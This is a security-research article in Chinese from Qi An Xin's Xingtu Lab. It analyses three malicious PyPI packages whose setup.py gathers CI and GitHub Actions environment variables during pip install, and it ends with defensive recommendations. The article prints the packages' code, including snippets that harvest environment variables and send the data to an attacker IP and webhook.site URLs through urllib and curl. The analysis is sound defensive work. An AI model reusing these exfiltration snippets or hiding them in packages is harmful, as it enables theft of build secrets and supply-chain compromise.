---
title: 【天问】发现针对CI/CD的PyPI恶意包投毒攻击
url: https://mp.weixin.qq.com/s/2iZJk51r_3Uzqagwj-940w
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:55:52.680076
---

# 【天问】发现针对CI/CD的PyPI恶意包投毒攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/QSjGzxHEMds7a6M6diad7l2kqhoOI8xyXpZv5kODAlCOUfJU4HlKNobEFTM5bNVPlRictMDAGavJSibosL3e0Qf7RrtrN8220iacqECjtvXLtHw/0?wx_fmt=jpeg)

# 【天问】发现针对CI/CD的PyPI恶意包投毒攻击

星图实验室
星图实验室

奇安信技术研究院

![]()

在小说阅读器中沉浸阅读

天问监测模块在2026年2月发现了一批针对CI/CD的恶意软件包，通过包名伪装来诱导用户下载，在依赖安装阶段隐蔽执行恶意代码，从而窃取CI运行环境中的构建元数据与敏感环境变量。

天问供应链威胁监测模块是奇安信技术研究星图实验室研发的“天问”软件供应链安全分析平台的子模块，”天问“分析平台对Python、npm等主流的开发生态进行了长期、持续的监测，发现了大量的恶意包和攻击行为。

## 1. 背景

随着 DevOps 和 CI/CD（Continuous Integration / Continuous Deployment）流程在软件工程中的广泛采用，自动化构建、测试和部署流水线已成为现代软件交付的核心基础设施。在这一过程中，CI/CD 系统通常需要从公共软件仓库（如 PyPI、npm、Maven Central 等）动态下载并安装大量第三方依赖包，以完成构建、测试及部署任务。

然而，这种高度自动化、强依赖第三方组件的模式，也显著扩大了软件供应链的攻击面。攻击者可以通过向公共包仓库投递恶意依赖包（Malicious Package），诱导 CI/CD 流水线在构建阶段自动执行恶意代码，从而实现：

* 敏感 CI 环境变量窃取（如 API Token、云平台密钥、SSH 私钥）
* 内网资产探测与横向移动
* 构建产物投毒，植入后门
* 持久化后门部署

## 2. 攻击样本概述

星图实验室天问软件供应链监测系统在春节期间发现了PyPI中出现的针对CI/CD的恶意软件包。我们挑选了其中3个来系统分析其攻击逻辑及危害，即`http_notifier_test-1.0.0`、`ci_metadata_python_logging-0.1.0`、`pylibcugraphops-23.12.0`。这些样本在命名、功能描述和行为逻辑上，均明显针对 CI/CD 场景进行定向投毒，具有典型代表性。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QSjGzxHEMdtPibdsSUc0icQH4GPeIYOA5vDqFibFB9eoBDxtjCKTEJYegjZvHTNy2ZMCbQnnicLseqevcgmkY4DW94UzIZXtMMnhh5icaDIdJY5A/640?wx_fmt=png&from=appmsg)

从命名风格可观察到，攻击者刻意采用“CI”、“metadata”、“logging”、“test”等关键词，使包名看起来高度贴合自动化构建、测试与日志采集场景，从而降低人工审查与用户警惕。

---

## 3. 恶意行为分析

### 3.1 利用 setup.py 触发自动执行

三个样本均将恶意逻辑嵌入于 `setup.py` 中。由于 Python 包在安装时会自动执行 `setup.py`，因此攻击者可在 **pip install 阶段实现无感执行**，极其适合 CI/CD 场景。这一阶段通常发生在：

* CI Runner
* GitHub Actions / GitLab Runner
* Jenkins Agent
* 云原生构建节点

且大多以 **高权限、全自动、无人工干预** 的方式执行，为攻击者提供了极佳的攻击窗口。

### **3.2 CI 环境识别与定向攻击**

恶意样本通常首先检测是否运行在 CI/CD 环境中：

```
import osif "CI" in os.environ or "GITHUB_ACTIONS" in os.environ:# 执行恶意逻辑
```

我们发现的三个样本，均在`setup.py`中尝试获取CI相关环境变量信息

`http_notifier_test`

```
ci_metadata = {"ci": os.environ.get("CI"),"github_actions": os.environ.get("GITHUB_ACTIONS"),"github_workflow": os.environ.get("GITHUB_WORKFLOW"),"github_run_id": os.environ.get("GITHUB_RUN_ID"),"github_run_number": os.environ.get("GITHUB_RUN_NUMBER"),"github_run_attempt": os.environ.get("GITHUB_RUN_ATTEMPT"),}
```

ci\_metadata\_python\_logging

```
ci_metadata": {"ci_detected": os.environ.get("CI", "false"),"gh_actions": os.environ.get("GITHUB_ACTIONS"),"gh_workflow": os.environ.get("GITHUB_WORKFLOW"),"gh_run_id": os.environ.get("GITHUB_RUN_ID"),"gh_actor": os.environ.get("GITHUB_ACTOR"), # Who triggered the run"gh_ref": os.environ.get("GITHUB_REF"),     # Branch or tag"git_commit": os.environ.get("GITHUB_SHA")}
```

pylibcugraphops

```
params = {"ip": ip,"ci": os.getenv("CI"),"gh_act": os.getenv("GITHUB_ACTIONS"),"gh_wf": os.getenv("GITHUB_WORKFLOW"),"gh_id": os.getenv("GITHUB_RUN_ID"),"gh_num": os.getenv("GITHUB_RUN_NUMBER"),
```

这些CI数据可以使攻击者精确定位受害项目的构建流程与代码状态，进而实现高度定向攻击，同时对于记录的CI流水线的GitHub用户身份，可以依此来构建针对性的钓鱼攻击。

### **3.3 HTTP外联通信**

这些恶意样本均实现了HTTP 外联模块，用于将窃取的数据发送至攻击者服务器。

`http_notifier_test`

```
BEACON_URL = "http[:]//164.90.176.41:23444"...# Send POST request with IP infojson_data = json.dumps(data).encode('utf-8')req = urllib.request.Request(BEACON_URL,data=json_data,headers={'Content-Type': 'application/json'})urllib.request.urlopen(req, timeout=3)
```

ci\_metadata\_python\_logging

```
# 3. Send to Webhook# Note: example.com is a placeholder; use your webhook.site URLwebhook_url = "https[:]//webhook.site/5940aa52-b829-4f0d-afe2-08d29d2922d0" req = urllib.request.Request(webhook_url,data=json.dumps(payload).encode("utf-8"),headers={"Content-Type": "application/json"},method="POST")# Short timeout ensures the install doesn't "hang" if the site is downurllib.request.urlopen(req, timeout=5)
```

pylibcugraphops

```
WEBHOOK_URL = "https[:]//webhook.site/1cee78e0-32f4-4e76-8f9d-f2bfa58784f9"COLLAB_DOMAIN = "your-collab-domain.oastify.com"...query = "&".join([f"{k}={v}" for k,v in params.items() if v])url = f"{WEBHOOK_URL}?{query}"subprocess.Popen(["curl", "-m", "3", "-s", url],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
```

从这些代码的结构和注释，我们不难发现这些攻击样本来自于固定的模版，攻击者只需修改其中的服务器地址就能实施攻击。

而且`pylibcugraphops`包名接近真实 CUDA / cuGraph 生态组件，描述信息中显示该包为依赖测试。如果这个包被攻击者使用依赖攻击来下载使用，将非常难以检测排查。这些恶意软件包针对的目标受众可能为高性能计算CI环境，一旦被攻破，其中的模型权重、私有数据、商业算法等高价值的内容都可能遭到窃取。

## 4. 防御与缓解建议

针对 CI/CD 环境中存在的恶意依赖投毒风险，应从依赖完整性校验、运行环境权限控制、构建阶段动态监控以及供应链威胁检测四个方面构建系统化防护体系。

* **依赖完整性校验：**

  对第三方依赖实施版本与哈希锁定，结合 pip install –require-hashes 机制，并统一使用受控的软件仓库，防止恶意包混入构建流程。
* **运行环境最小权限化：**

  遵循最小权限原则，避免默认注入高权限访问令牌，对 CI 任务实施分级授权，并将构建节点与生产环境进行隔离，降低凭据泄露带来的扩散风险。
* **构建阶段动态监控：**

  对 pip install 过程进行实时监控，重点检测 setup.py 中的环境变量扫描、网络外联和可疑命令执行行为，实现对攻击的早期发现与阻断。
* **供应链威胁检测：**

  结合静态分析与动态检测技术，构建面向 CI/CD 场景的检测机制，通过 AST 解析识别恶意安装脚本行为，实现对 CI 定向恶意包的自动化防护。

## 5. 结论

我们系统分析了三个针对 CI/CD 生态的 PyPI 恶意包样本，揭示了一类高度隐蔽、定向性强的软件供应链攻击模式。攻击者通过在 setup.py 中嵌入恶意逻辑，实现对 CI 运行环境的自动化信息收集，重点窃取构建流水线元数据与敏感环境变量，从而为后续的定向攻击、凭据滥用与潜在的供应链渗透提供关键情报基础。

该攻击范式对现代 DevOps 架构构成严峻挑战，尤其在高度自动化的构建环境中，信息窃取行为本身即可引发严重的安全连锁反应，亟需在依赖管理、CI 运行权限控制以及自动化威胁检测等层面构建系统性防御机制。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/lG0evzxL96k3J9EIwMqhiacpDHibsxFTCugUuHF9VUnGG5ceic7dILO41pMNfer7OzCyIviaBYAWAZicicVfocuO8HKw/0?wx_fmt=png)

奇安信技术研究院

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/lG0evzxL96k3J9EIwMqhiacpDHibsxFTCugUuHF9VUnGG5ceic7dILO41pMNfer7OzCyIviaBYAWAZicicVfocuO8HKw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过